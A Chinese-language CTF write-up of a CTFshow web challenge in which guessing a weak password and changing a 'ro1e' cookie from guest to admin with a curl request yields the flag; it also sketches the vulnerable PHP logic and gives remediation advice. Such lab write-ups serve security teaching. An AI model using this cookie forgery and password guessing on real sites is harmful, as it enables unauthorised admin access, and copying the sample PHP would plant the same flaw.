# CTF Writeup - Cookie 注入（Cookie Injection）

## 题目信息
- **平台**: CTFshow
- **题目链接**: https://70273377-7005-49e0-8500-d7b8b5bfcf9e.challenge.ctf.show/
- **题目类型**: Web
- **漏洞类型**: Broken Access Control - Cookie 角色伪造
- **难度**: 简单
- **Flag**: `CTF{cookie_injection_is_fun}`

---

## 解题思路

### 1. 信息收集
访问目标URL，发现一个登录页面：
- 标题: `CTFshow Admin Login`
- 用户名输入框固定为 `guest`（readonly）
- 密码输入框可自由输入
- 表单提交到 `/check.php`
- 服务器: nginx/1.20.1 + PHP

### 2. 弱密码尝试
尝试常见弱密码登录：
- `admin` → 失败
- `123456` → 失败
- `guest` → **成功！**

响应：`Login successful! welcome guest user`

同时观察到响应头：
```
Set-Cookie: ro1e=guest; expires=...; Max-Age=3600
```

### 3. 漏洞分析
注意到 Cookie 名为 `ro1e`，这是 "role" 的 l33t 写法（o→0, l→1）。推测系统通过客户端 Cookie 来判断用户角色，存在明显的信任客户端输入问题。

### 4. 漏洞利用
将 Cookie `ro1e` 的值从 `guest` 修改为 `admin`，重新发送登录请求：

```bash
curl -k -X POST \
  'https://70273377-7005-49e0-8500-d7b8b5bfcf9e.challenge.ctf.show/check.php' \
  -H 'Cookie: ro1e=admin' \
  -d 'username=guest&password=guest'
```

### 5. 获取Flag
响应：
```
You are logged in as an admin user! Flag: CTF{cookie_injection_is_fun}
```

---

## 漏洞原理

系统将用户角色信息存储在客户端 Cookie 中，服务端完全信任客户端传入的 `ro1e` 值来判定用户权限。攻击者可以任意修改 Cookie 值来提升权限。

**错误的后端逻辑（推测）**:
```php
<?php
// 登录时设置 Cookie
if ($username === 'guest' && $password === 'guest') {
    setcookie('ro1e', 'guest', time() + 3600);
    echo "Login successful! welcome guest user";
}

// 权限检查完全依赖客户端 Cookie
if ($_COOKIE['ro1e'] === 'admin') {
    echo "You are logged in as an admin user! Flag: CTF{cookie_injection_is_fun}";
}
?>
```

**正确的做法**应该在服务端 Session 中管理用户角色，而非信任客户端 Cookie。

---

## 修复建议

1. 使用服务端 Session 存储用户身份和角色
2. 对敏感 Cookie 使用 HMAC 签名或加密
3. 不要在客户端可控的 Cookie 中存储权限相关信息
4. 每次请求都在服务端验证用户权限

---

## 时间线
- 2026-07-27: 发现并利用漏洞，获取 Flag